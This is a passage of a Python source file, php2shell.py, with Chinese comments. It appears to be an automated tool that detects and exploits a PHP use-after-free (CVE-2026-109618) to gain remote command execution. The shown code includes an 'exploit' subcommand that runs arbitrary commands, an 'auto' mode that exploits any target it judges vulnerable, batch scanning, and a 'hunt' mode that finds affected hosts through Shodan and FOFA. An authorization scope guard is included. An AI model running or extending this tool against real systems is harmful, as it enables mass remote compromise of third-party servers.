    okn = sum(1 for r in results if r.get('ok'))
    last = dict(results[-1])
    last['multi'] = {'total': len(cmds), 'ok': okn, 'results': results}
    last['ok'] = okn > 0
    print(info('[multi] 完成：%d/%d 条命令成功' % (okn, len(cmds))))
    return last


def summarize(rpt):
    v = rpt.get('verdict', V_SAFE)
    color = {V_RCE: ok, V_LIKELY: ok, V_PREMISES: warn, V_DOS: warn, V_SAFE: dim,
             V_NOSINK: warn, V_DOWN: bad}.get(v, dim)
    print()
    print(bold('=' * 62))
    print('目标   : %s' % rpt.get('url'))
    print('结论   : %s' % color(v))
    if rpt.get('php_version'):
        print('PHP    : %s' % rpt['php_version'])
    if rpt.get('precondition'):
        print('前置   : %s' % rpt['precondition'])
    if rpt.get('memory_limit'):
        print('内存   : memory_limit = %s bytes' % rpt['memory_limit'])
    if rpt.get('oom_landing') is not None:
        print('OOM落点: tried = %s bytes' % rpt['oom_landing'])
    if rpt.get('landing_stage'):
        print('阶段   : %s' % rpt['landing_stage'])
    sinks = rpt.get('steps', {}).get('sinks')
    if sinks:
        print('消费点 : %s' % ', '.join(s['path'] for s in sinks[:4]))
    print(bold('=' * 62))


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------
def build_parser():
    ap = argparse.ArgumentParser(
        prog='php2shell.py',
        description='CVE-2026-109618 一体化自动检测与利用',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='示例:\n'
               '  php2shell.py http://t/index.php\n'
               '  php2shell.py scan -u http://t/ --safe\n'
               "  php2shell.py exploit -u http://t/ -c 'id>/tmp/p'\n"
               '  php2shell.py batch -f list.txt --workers 4 -o out.json\n')
    sub = ap.add_subparsers(dest='subcmd')

    def common(p):
        p.add_argument('-u', '--url', help='目标 URL')
        p.add_argument('-f', '--file', help='批量目标文件（每行一个）')
        p.add_argument('-o', '--out', default=None, help='JSON 报告输出路径')
        p.add_argument('--json', action='store_true', help='仅输出 JSON')
        p.add_argument('--timeout', type=float, default=20.0, help='单请求超时秒，默认 20')
        p.add_argument('--max-mb', type=int, default=32, help='CL 探测最大 body MB，默认 32')
        p.add_argument('--workers', type=int, default=4, help='批量并发数，默认 4')
        p.add_argument('--workers-dirty', type=int, default=8, help='并发污染 worker 数，默认 8')
        p.add_argument('--no-color', action='store_true')
        p.add_argument('--scope-file', default=None, metavar='FILE',
                       help='授权范围白名单文件（每行一个 IP/CIDR/域名，# 注释）；'
                            '不在白名单内的公网地址一律拒绝攻击')
        p.add_argument('--allow-public', action='store_true',
                       help='允许攻击公网地址（必须已持有该资产的书面授权；默认关闭）')
        p.add_argument('--dry-run', action='store_true',
                       help='只做授权范围校验并打印目标，不发任何请求')
        p.add_argument('--no-active-uaf', action='store_true',
                       help='跳过主动 UAF 实测（会退化为仅前置判定，不下 RCE 结论）')
        p.add_argument('--active-rounds', type=int, default=2,
                       help='主动 UAF 实测轮数，默认 2（同连接 污染->解引用）')
        p.add_argument('--insecure', action='store_true',
                       help='https 目标跳过 TLS 证书校验（自签/过期证书的授权靶场）；默认严格校验')

    for name, hlp in (('auto', '检测，若判定可 RCE 则自动利用'),
                      ('scan', '仅检测（不利用）'),
                      ('exploit', '直接三阶段 RCE（自动泄漏）'),
                      ('batch', '批量检测')):
        p = sub.add_parser(name, help=hlp)
        common(p)
        if name in ('scan', 'auto', 'batch'):
            p.add_argument('--safe', action='store_true', help='跳过堆破坏验证（更保守）')
            p.add_argument('--try-leak', action='store_true',
                           help='追加 Stage-1 泄漏探针以区分受影响/已修复（含 OOM，具破坏性）')
            p.add_argument('--leak-rounds', type=int, default=6)
        if name == 'scan':
            p.add_argument('--stage1-n', type=int, default=None)
        if name in ('exploit', 'auto'):
            p.add_argument('-c', '--cmd', action='append', default=None,
                           metavar='CMD',
                           help='命令（<=%d 字节）；可重复多次，按序逐条执行' % CMD_CAPACITY)
            p.add_argument('--cmd-file', default=None,
                           metavar='FILE',
                           help='命令文件，每行一条（忽略空行与 # 注释）')
            p.add_argument('--proof-file', default=None, help='proof 文件路径（单命令时生效）')
            p.add_argument('--proof-dir', default=None, metavar='DIR',
                           help='多命令时的本地 proof 目录：命令里 >/out/x 会映射到 DIR/x')
            p.add_argument('--ht-size', type=int, default=HT_SIZE, metavar='N',
                           help='伪造结构字节数（默认 %d，容量=%d 字节）；'
                                '改大需配合 --htdata-offset 重新标定' % (HT_SIZE, CMD_CAPACITY))
            p.add_argument('--rounds', type=int, default=30)
            p.add_argument('--proxy', default=None, metavar='URL',
                           help='经单个代理出网（http:// 或 socks5://，可带 user:pass@）；'
                                '用于企业代理/内网跳板/联动 Burp')
            p.add_argument('-H', '--header', action='append', default=None,
                           metavar='"K: V"',
                           help='追加/覆盖请求头，可重复。例如 -H "User-Agent: my-test"')
            p.add_argument('--source-addr', action='append', default=None, metavar='IP',
                           help='绑定本机源地址，可重复（按连接轮换）。只能填本机已配置的地址，'
                                '用于多源并发验证 LB 粘性/单IP限流/风控逻辑；'
                                '填非本机地址会 bind 失败')
            p.add_argument('--rate', type=float, default=0.0, metavar='SEC',
                           help='每条命令之间的间隔秒数（默认 0），用于给目标留恢复时间')
            p.add_argument('--stage1-n', type=int, default=None)
            p.add_argument('--stage2-t', type=int, default=None)
            p.add_argument('--zif-offset', type=lambda x: int(x, 0), default=None)
            p.add_argument('--dtor-offset', type=lambda x: int(x, 0), default=None)
            p.add_argument('--htdata-offset', type=lambda x: int(x, 0), default=None)
            p.add_argument('--leak-retries', type=int, default=3)

    # ---- hunt: 资产发现与版本判定（Shodan / FOFA，被动检索）----
    hp = sub.add_parser(
        'hunt', help='资产发现：Shodan/FOFA 检索 + PHP 版本判定（不做漏洞探测）')
    hp.add_argument('--shodan-key', default=None,
                    help='Shodan API key（或环境变量 SHODAN_API_KEY）')
    hp.add_argument('--fofa-key', default=None,
                    help='FOFA API key（或环境变量 FOFA_KEY）')
    hp.add_argument('--fofa-email', default=None,
                    help='FOFA 账号邮箱（部分接口版本需要）')
    hp.add_argument('--query', action='append', default=None, metavar='Q',
                    help='自定义检索式，可重复；不填则用内置 PHP 检索式')
    hp.add_argument('--php-version', default=None, metavar='X.Y.Z',
                    help='按具体 PHP 版本筛选，例如 8.4.26（自动生成两引擎检索式）')
    hp.add_argument('--pages', type=int, default=1,
                    help='Shodan 页数（每页 100 条，每页消耗 1 query credit）')
    hp.add_argument('--size', type=int, default=100,
                    help='FOFA 返回条数上限（受账号权限限制）')
    hp.add_argument('--from-json', default=None, metavar='FILE',
                    help='离线导入已保存的 API 响应（无 key 时可用）')
    hp.add_argument('--fingerprint', action='store_true',
                    help='对每个候选发一次普通 GET 读 Header 判版本；'
                         '这是唯一接触目标的动作，会对每个 IP 产生 1 条访问日志')
    hp.add_argument('--fp-limit', type=int, default=200,
                    help='--fingerprint 最多探测多少条（默认 200）')
    hp.add_argument('--only-affected', action='store_true',
                    help='输出只保留 AFFECTED')
    hp.add_argument('--emit-targets', default=None, metavar='FILE',
                    help='把 AFFECTED 目标写成 URL 列表，供 scan / batch 使用')
    hp.add_argument('--timeout', type=float, default=20.0)
    hp.add_argument('--proxy', default=None)
    hp.add_argument('--json', action='store_true')
    hp.add_argument('--scope-file', default=None, metavar='FILE',
                    help='授权范围白名单文件；--fingerprint 只会探测其中（或本机/私网）的地址，'
                         '导出的 targets 也建议用同一份白名单喂给 batch')
    hp.add_argument('--allow-public', action='store_true',
                    help='允许 --fingerprint 探测公网地址（必须持有书面授权；默认关闭）')
    hp.add_argument('--no-color', action='store_true')
    return ap


def normalize_url(raw):
    raw = raw.strip()
    if not raw or raw.startswith('#'):
        return None
    if '://' not in raw:
        raw = 'http://' + raw
    return raw


# --------------------------------------------------------------------------
# 授权范围护栏（scope guard）
#
# 本工具默认只允许攻击「本机 / 私网 / 链路本地」地址，公网地址必须在
# --scope-file 白名单中显式列出，否则一律拒绝。这样做的目的是：把「批量
# 检测→自动攻击」严格约束在你持有书面授权的资产上，避免误伤第三方。
# --------------------------------------------------------------------------
DEFAULT_ALLOWED_NETS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
    ipaddress.ip_network('fe80::/10'),
]


class Scope:
    def __init__(self, allow_file=None, allow_public=False):
        self.nets = list(DEFAULT_ALLOWED_NETS)
        self.hosts = set()
        self.allow_public = bool(allow_public)
        if allow_file:
            with open(allow_file, 'r', encoding='utf-8') as fh:
                for line in fh:
                    s = line.split('#', 1)[0].strip()
                    if not s:
                        continue
                    try:
                        self.nets.append(ipaddress.ip_network(s, strict=False))
                    except ValueError:
                        self.hosts.add(s.lower())

    def verdict(self, url):
        host = (urlparse(url).hostname or '').lower()
        if not host:
            return False, 'URL 无主机名'
        if host in self.hosts:
            return True, 'host 白名单'
        try:
            ips = [ipaddress.ip_address(host)]
        except ValueError:
            try:
                infos = socket.getaddrinfo(host, None)
            except Exception as exc:
                return False, '域名无法解析: %s' % exc
            seen = {}
            for info in infos:
                try:
                    ip = ipaddress.ip_address(info[4][0])
                except ValueError:
                    continue
                seen[str(ip)] = ip
            ips = list(seen.values())
        if not ips:
            return False, '域名无 A/AAAA 记录'
        for ip in ips:
            if ip.is_loopback or ip.is_private or ip.is_link_local:
                continue
            if any(ip in n for n in self.nets):
                continue
            if self.allow_public:
                continue
            return False, '%s 是公网地址且不在 --scope-file 白名单内' % ip
        return True, ', '.join(str(i) for i in ips)

    def filter(self, urls, label='target'):
        allowed, refused = [], []
        for u in urls:
            ok, why = self.verdict(u)
            if ok:
                allowed.append(u)
            else:
                refused.append((u, why))
        for u, why in refused:
            sys.stderr.write('[scope] 拒绝 %s %s —— %s\n' % (label, u, why))
        if refused and not allowed:
            sys.stderr.write(
                '[scope] 全部目标被授权范围护栏拒绝。\n'
                '[scope] 若这些资产确属你的授权范围，请把 IP/CIDR/域名写入 --scope-file；\n'
                '[scope] 没有书面授权时请勿使用 --allow-public。\n')
        return allowed, refused


def scope_from_args(args):
    return Scope(getattr(args, 'scope_file', None),
                 getattr(args, 'allow_public', False))


def active_crash_probe(url, timeout=30.0, rounds=2):
    """主动 UAF 实测：在同一条 keep-alive 连接上 A(污染请求)->B(解引用请求)。

    这是把「前置条件满足」升级为「UAF 实测成立」的关键一步：已修复版本
    在这条判据下会稳定给出未崩溃（PREMISES / SAFE），而受影响版本会
    确定性打崩 worker。返回 {'verdict': 'worker_killed'|'no_crash'|...}。
    """
    try:
        import php2shell_attack as kaa
    except Exception as exc:  # 模块缺失或环境不支持
        return {'verdict': 'unavailable', 'error': repr(exc), 'crashes': 0}
    try:
        atk = kaa.Attack(url, kaa.Weapon(), max(float(timeout), 30.0), verbose=False)
        res = dict(atk.crash_test(rounds=rounds) or {})
        res.setdefault('rounds', rounds)
        return res
    except Exception as exc:
        return {'verdict': 'error', 'error': repr(exc), 'crashes': 0}




def do_scan_only(url, args):
    rpt = scan_target(url, args)
    if not args.json:
        summarize(rpt)
    return rpt


def do_auto(url, args):
    rpt = scan_target(url, args)
    if not args.json:
        summarize(rpt)
    verdict = rpt.get('verdict')
    if verdict in (V_RCE, V_LIKELY):
        sinks = rpt.get('steps', {}).get('sinks') or []
        sink = sinks[0]['path'] if sinks else '/'
        if not args.json:
            print()
            log('auto', ok('判定可 RCE，自动进入利用阶段'))
        res = exploit_target(url, sink, args)
        rpt['exploit'] = res
        if not args.json:
            if res.get('ok'):
                print()
                log('auto', ok('RCE 成功'))
                if res.get('proof'):
                    print(dim('--- proof ---'))
                    print(res['proof'].strip())
            else:
                log('auto', bad('利用未成功: %s' % res.get('reason', '')))
    elif not args.json:
        log('auto', warn('未判定为 RCE 就绪，跳过利用（可用 exploit 子命令强制尝试）'))
    return rpt


def do_batch(args):
    targets = []
    if args.file:
        with open(args.file, 'r', encoding='utf-8', errors='replace') as fh:
            for line in fh:
                u = normalize_url(line)
                if u:
                    targets.append(u)
    if args.url:
        targets.append(normalize_url(args.url))
    if not targets:
        print('批量模式需要 -f 目标文件', file=sys.stderr)
        return [], 1

    sc = scope_from_args(args)
    targets, refused = sc.filter(targets)
    if getattr(args, 'dry_run', False):
        for u in targets:
            print('[dry-run] in-scope: %s' % u)
        print('[dry-run] 共 %d 个在范围内、%d 个被拒绝，未发任何请求'
              % (len(targets), len(refused)))
        return [], 0
    if not targets:
        return [], 3

    results = []
    log('batch', '共 %d 个目标，并发 %d' % (len(targets), args.workers))
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as pool:
        futs = {pool.submit(scan_target, u, args): u for u in targets}
        for f in as_completed(futs):
            u = futs[f]
            try:
                results.append(f.result())
            except Exception as e:
                results.append({'url': u, 'verdict': V_DOWN, 'error': str(e)})
    results.sort(key=lambda x: x.get('url', ''))
    for r in results:
        if not args.json:
            summarize(r)
    counts = {}
    for r in results:
        counts[r.get('verdict')] = counts.get(r.get('verdict'), 0) + 1
    print()
    log('batch', '汇总: %s' % ', '.join('%s=%d' % kv for kv in sorted(counts.items())))
    return results, 0


def do_hunt(args):
    """
    资产发现：Shodan / FOFA 被动检索 + 可选被动指纹 + 版本判定。

    明确不做：不向检索结果发起漏洞探测、不发起 OOM 请求、不自动 exploit。
    对任何结果执行 scan/exploit 之前，授权责任在使用者。
    """
    try:
        import discover
    except ImportError:
        print('缺少 attack/discover.py，请从完整交付包运行', file=sys.stderr)
        return 1

    items = []

    # 1) 离线导入
    if args.from_json:
        items = discover.load_from_json(args.from_json)
        log('hunt', '离线导入 %d 条: %s' % (len(items), args.from_json))

    # 2) 在线检索
    else:
        skey = args.shodan_key or os.environ.get('SHODAN_API_KEY')
        fkey = args.fofa_key or os.environ.get('FOFA_KEY')
        if not skey and not fkey:
            print('未提供 API key。可用 --shodan-key / --fofa-key，'
                  '或环境变量 SHODAN_API_KEY / FOFA_KEY，'
                  '或用 --from-json 导入已保存的响应。', file=sys.stderr)
            return 1

        queries = list(args.query or [])
        if not queries:
            queries = [discover.shodan_query(args.php_version)] if skey else []
            fq = discover.fofa_query(args.php_version)
            if fkey:
                queries.append(fq)
        log('hunt', '检索式: %s' % ' | '.join(queries))

        if skey:
            for q in queries:
                if q.startswith('header='):
                    continue
                rows, err = discover.shodan_search(
                    skey, q, pages=args.pages,
                    timeout=args.timeout, proxy=args.proxy)
                if err:
                    log('hunt', err)
                else:
                    log('hunt', 'Shodan "%s" → %d 条' % (q[:48], len(rows)))
                    items.extend(rows)
        if fkey:
            for q in queries:
                if not q.startswith('header=') and len(queries) > 1:
                    continue
                rows, err = discover.fofa_search(
                    fkey, q, size=args.size,
                    timeout=args.timeout, proxy=args.proxy,
                    email=args.fofa_email)
                if err:
                    log('hunt', err)
                else:
                    log('hunt', 'FOFA "%s" → %d 条' % (q[:48], len(rows)))
                    items.extend(rows)

    items = discover.dedupe(items)
    for it in items:
        it['url'] = discover.to_url(it)
        it.setdefault('verdict', '-')
        it.setdefault('note', '')
        if it.get('banner_ver') and it['verdict'] == '-':
            it['php_ver'] = it['banner_ver']
            it['verdict'], it['note'] = discover.judge(it['banner_ver'])

    # 3) 可选被动指纹（唯一接触目标的动作，普通 GET 一次）
    if args.fingerprint and items:
        sc = scope_from_args(args)
        allowed_urls, refused = sc.filter([it['url'] for it in items], label='hunt')
        allowed_set = set(allowed_urls)
        if refused:
            log('hunt', '授权范围护栏跳过 %d 条（未探测）' % len(refused))
        fp_items = [it for it in items if it['url'] in allowed_set][:args.fp_limit]
        if fp_items:
            log('hunt', '被动指纹：%d 条，每条 1 次普通 GET'
                        '（不发送任何变形 payload）' % len(fp_items))
            discover.enrich(fp_items, timeout=args.timeout, proxy=args.proxy,
                            limit=args.fp_limit)

    # 4) 输出
    if args.json:
        print(json.dumps(items, ensure_ascii=False, indent=2))
        n_aff = sum(1 for it in items if it.get('verdict') == 'AFFECTED')
    else:
        n_aff = discover.render(items, only_affected=args.only_affected)

    if args.emit_targets:
        n = discover.emit_targets(items, args.emit_targets, only_affected=True)
        log('hunt', '已写出 %d 条 AFFECTED 目标 → %s'
                    '（PATCHED/UNKNOWN 不写入，避免误打）' % (n, args.emit_targets))

    log('hunt', '完成：AFFECTED=%d / 合计=%d' % (n_aff, len(items)))
    if n_aff:
        log('hunt', '注意：本子命令不执行漏洞探测。对上述目标发起 scan/exploit 前，'
                    '请自行确认已获授权。')
    return 0


def main():
    argv = sys.argv[1:]
    known = {'auto', 'scan', 'exploit', 'batch', 'hunt'}
    if argv and argv[0] not in known and not argv[0].startswith('-'):
        argv = ['auto', '-u', argv[0]] + argv[1:]
    if not argv or argv[0] in ('-h', '--help'):
        build_parser().print_help()
        return 0

    args = build_parser().parse_args(argv)
    if args.no_color:
        global USE_COLOR
        USE_COLOR = False
    if not getattr(args, 'cmd', None):
        args.cmd = 'id>/tmp/p1'

    if args.subcmd == 'batch':
        results, code = do_batch(args)
        if args.out:
            with open(args.out, 'w', encoding='utf-8') as fh:
                json.dump(results, fh, ensure_ascii=False, indent=2)
            log('batch', '报告已写入 %s' % args.out)
        return code

    if args.subcmd == 'hunt':
        return do_hunt(args)

    if not args.url:
        print('需要 -u/--url', file=sys.stderr)
        return 1
    url = normalize_url(args.url)

    sc = scope_from_args(args)
    in_scope, why = sc.verdict(url)
    if not in_scope:
        sys.stderr.write('[scope] 拒绝 %s —— %s\n' % (url, why))
        sys.stderr.write('[scope] 若该目标确在你的授权范围，请写入 --scope-file；'
                         '未获书面授权请勿使用 --allow-public。\n')
        return 3
    if getattr(args, 'dry_run', False):
        print('[dry-run] in-scope: %s (%s)' % (url, why))
        return 0

    if args.subcmd == 'scan':
        rpt = do_scan_only(url, args)
    elif args.subcmd == 'exploit':
        cli, path = new_client(url, args.timeout)
        sinks = discover_sinks(url, cli, path, timeout=args.timeout)
        sink = sinks[0]['path'] if sinks else path
        if not args.json:
            log('exploit', '消费点: %s' % sink)
        res = exploit_target(url, sink, args)
        rpt = {'url': url, 'exploit': res,
               'verdict': V_RCE if res.get('ok') else V_SAFE}
        if not args.json:
            if res.get('ok'):
                log('exploit', ok('RCE 成功'))
                if res.get('proof'):
                    print(dim('--- proof ---'))
                    print(res['proof'].strip())
            else:
                log('exploit', bad('失败: %s' % res.get('reason', '')))
    else:
        rpt = do_auto(url, args)

    if args.out:
        with open(args.out, 'w', encoding='utf-8') as fh:
            json.dump(rpt, fh, ensure_ascii=False, indent=2)
        log('report', '已写入 %s' % args.out)

    if args.json:
        print(json.dumps(rpt, ensure_ascii=False, indent=2))

    if rpt.get('exploit', {}).get('ok'):
        return 0
    return EXIT.get(rpt.get('verdict'), 30)


if __name__ == '__main__':
    sys.exit(main())
